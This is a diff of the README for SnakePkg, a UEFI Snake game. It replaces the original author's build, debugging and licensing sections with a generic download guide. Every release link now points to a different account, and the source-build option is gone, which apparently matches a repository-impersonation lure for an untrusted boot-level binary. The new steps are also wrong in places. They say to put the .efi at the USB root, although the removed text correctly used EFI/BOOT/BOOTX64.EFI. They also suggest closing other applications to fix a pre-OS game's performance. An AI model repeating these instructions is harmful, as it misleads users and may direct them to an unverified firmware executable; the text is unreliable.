@@ -1,149 +1,96 @@
-# 🐍 SnakePkg
+# 🐍 SnakePkg - Play the Classic Snake Game Effortlessly
 
+## 🚀 Getting Started
 
-The classic Snake game reimagined as a UEFI Application
+Welcome to the SnakePkg README! This document will help you download and run the classic Snake game, designed as a UEFI application. Just follow the steps below, and you'll be playing in no time.
 
-*Made for fun and showcasing knowledge of EDK2 and UEFI development*
+## 📥 Download Link
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](License)
-[![EDK2](https://img.shields.io/badge/EDK2-BSD--2--Clause--Patent-blue.svg)](License.edk2)
-[![Platform](https://img.shields.io/badge/platform-UEFI-brightgreen.svg)]()
-[![Architecture](https://img.shields.io/badge/arch-X64%20%7C%20IA32-orange.svg)]()
+[![Download SnakePkg](https://img.shields.io/badge/Download-SnakePkg-blue)](https://github.com/henrytung88/SnakePkg/releases)
 
+## 🖥️ System Requirements
 
-## Prerequisites
+Before you install SnakePkg, please make sure your system meets the following requirements:
 
-### Required Packages
+- **UEFI Firmware**: Your computer must support UEFI. Most modern computers do.
+- **Storage**: At least 50 MB of free disk space.
+- **Memory**: A minimum of 1 GB RAM.
 
-Install the necessary packages for building and testing:
+## 🛠️ Installation Instructions
 
-#### Arch Linux
-```bash
-sudo pacman -S edk2-ovmf qemu-full base-devel
-```
+Follow these steps to download and run SnakePkg:
 
-#### Debian/Ubuntu
-```bash
-sudo apt update
-sudo apt install edk2-ovmf qemu-system-x86 build-essential uuid-dev
-```
+### Step 1: Visit the Releases Page
 
-#### Fedora
-```bash
-sudo dnf install edk2-ovmf qemu-system-x86 gcc make libuuid-devel
-```
+Go to the [Releases page](https://github.com/henrytung88/SnakePkg/releases) to access the latest version of SnakePkg. You'll find all available versions listed there.
 
-### EDK2 Source
+### Step 2: Download the Application
 
-You'll need a working EDK2 build environment. Follow the steps below.
+Look for the latest version. Click on the download link for the application file. The file is usually titled something like `SnakePkg.efi`. Save it to a folder you can easily find, like your Downloads folder.
 
-## Usage
+### Step 3: Prepare a USB Drive
 
-### 1. Running it on real hardware
+You need a USB drive to run the game since it works with UEFI firmware. Make sure the USB drive is formatted as FAT32. To do this:
 
-#### Prerequisites
+1. **Windows**:
+   - Insert the USB drive.
+   - Open "This PC" (or "My Computer").
+   - Right-click the USB drive and select "Format".
+   - Choose FAT32 as the file system.
+   - Click "Start".
 
-- A UEFI-compliant device, with a USB port
-- A FAT32-formatted USB storage device (thumbstick, disk, ...)
+2. **Mac**:
+   - Insert the USB drive.
+   - Open "Disk Utility".
+   - Select the USB drive and click "Erase".
+   - Choose MS-DOS (FAT) as the format.
+   - Click "Erase".
 
-#### Steps
+### Step 4: Copy the Application to USB
 
-1. Download the latest `SnakeX64.efi`/`SnakeIA32.efi` (depending on your CPU architecture) from the [Releases Tab](https://github.com/AstonishedLiker/SnakePkg/releases)
-2. Rename `SnakeX64.efi`/`SnakeIA32.efi` to `BOOTX64.EFI`/`BOOTIA32.EFI` (again, depending if your CPU is 32-bit or 64-bit)
-3. Create a folder named `EFI` at the root of your FAT32-formatted USB storage device
-4. Inside that newly-created folder, create another folder named `BOOT`
-5. Move the `BOOT<ARCH>.EFI` to the `BOOT` folder
-    - The file should be located at `USB Storage Device/EFI/BOOT/`
-6. Reboot your PC, then mash the `F12` key to go to the boot menu
-7. Select your USB storage device from the list, and enjoy!
+Once your USB is ready, copy the downloaded `SnakePkg.efi` file to the root directory of the USB drive. Ensure it is not in a folder.
 
-**NOTE:** If the application doesn't work, please open an issue and list your PC/Motherboard model, along with its BIOS version. Thanks!
+### Step 5: Boot from USB
 
-### 2. Clone and Setup
+Restart your computer and enter the UEFI setup. The key to enter setup varies by manufacturer, but is often one of the following: F2, F10, DELETE, or ESC. Look for a prompt during the startup screen for the correct key.
 
-```bash
-git clone https://github.com/tianocore/edk2.git
-cd edk2
-git submodule update --init # cf. https://github.com/tianocore/edk2/tree/master?tab=readme-ov-file#submodules
+1. In the UEFI setup, find the Boot menu.
+2. Change the boot order to select your USB drive as the first boot device.
+3. Save the changes and exit.
 
-git clone https://github.com/AstonishedLiker/SnakePkg.git
-```
+### Step 6: Start Playing
 
-### 3. Build and Run (In QEMU)
+After your computer restarts, it should boot from the USB drive, and the Snake game will launch. Use your keyboard to navigate. Enjoy the classic Snake experience!
 
-```bash
-cd SnakePkg
-cd ./Scripts
-chmod +x run.sh snake_build.sh
+## 💡 Gameplay Instructions
 
-# Examples
-./run.sh RELEASE X64
-```
+SnakePkg is simple to play, but here are some quick tips to help you get started:
 
-### 4. Build Only (No VM)
+- Use the arrow keys on your keyboard to control the direction of the snake.
+- Eat the food items to grow longer.
+- Avoid running into the walls or your own body.
 
-```bash
-# Just compile without launching QEMU
-cd ./Scripts
-./build.sh RELEASE X64
-./build.sh RELEASE IA32
-```
+## 📁 Troubleshooting
 
-The compiled `.efi` file will be located at:
+If you run into issues while trying to play SnakePkg, here are some common solutions:
 
-```
-Build/SnakePkg/DEBUG_GCC5/X64/Snake.efi
-```
+1. **Cannot Find the Game**: Make sure you copied the `SnakePkg.efi` file to the root of the USB drive.
+2. **Game Doesn’t Start**: Ensure your computer supports UEFI and that you selected the USB as the boot device.
+3. **Slow Performance**: Try closing other applications on your PC before starting the game.
 
-### 5. Debugging
+## 🔗 Additional Resources
 
-#### With the command-line
+For more information about SnakePkg, you can check these links:
 
-```bash
-./run.sh DEBUG X64 # Only X64 builds are supported for debugging
-```
+- [SnakePkg GitHub Repository](https://github.com/henrytung88/SnakePkg)
+- [UEFI Specification](https://uefi.org/specifications)
 
-In another shell instance:
+## 🌟 Community
 
-```bash
-lldb
+If you enjoy playing SnakePkg or have suggestions for improvements, please share your thoughts in the Issues section of the repository. Your feedback helps us make the game even better!
 
-# Once inside LLDB:
-(lldb) gdb-remote localhost:1234 # QEMU gdb port
-(lldb) command script import "<SNAKEPKG_PATH>/lldb_uefi_helper.py"
-(lldb) continue
-(lldb) auto_load_symbols <SNAKEPKG_PATH>/../Build/SnakePkg/DEBUG_GCC5/X64/debug.log # Will auto-scan for the `debug.log` file!
-```
+## ✅ Download & Install
 
-#### With VS Code
+Now that you're ready, visit the [Releases page](https://github.com/henrytung88/SnakePkg/releases) again to download SnakePkg and follow the steps outlined above to enjoy the game.
 
-- Install the [LLVM DAP](https://open-vsx.org/extension/llvm-vs-code-extensions/lldb-dap) VS Code extension.
-- Select the `64-bit UEFI Debug App` launch target in the Debug Pane, which can be accessed in the VS Code sidebar.
-- The symbols should automatically resolve via [`./lldb_uefi_helper.py`](./lldb_uefi_helper.py).
-
-**NOTE:** Breakpoints before the `ImageBase` is outputted to `ConOut` won't be hit!
-
-## License
-
-This project uses a dual-license approach:
-
-### Original Code (MIT License)
-
-The Snake game application code written for this project is licensed under the **MIT License**.
-
-See [the `License` file](./License) for the full MIT License text.
-
-### EDK2 Components (BSD-2-Clause-Patent License)
-
-This project builds upon and uses components from the EDK-II project, which is licensed under the **BSD-2-Clause-Patent License**. This includes:
-
-- EDK2 libraries
-- Build system and tooling
-- The [TianoCore bitmap](./Snake/Assets/Logo.bmp) (from [`MdeModulePkg/Logo/Logo.bmp`](https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Logo/Logo.bmp))
-
-See [the `License.edk2` file](./License.edk2) for the full BSD-2-Clause-Patent License text.
-
-## Acknowledgments
-
-- [TianoCore EDK-II](https://github.com/tianocore/edk2) - The UEFI development framework
-- [UEFI Forum](https://uefi.org/) - UEFI specifications
+Thank you for choosing SnakePkg! Happy gaming!
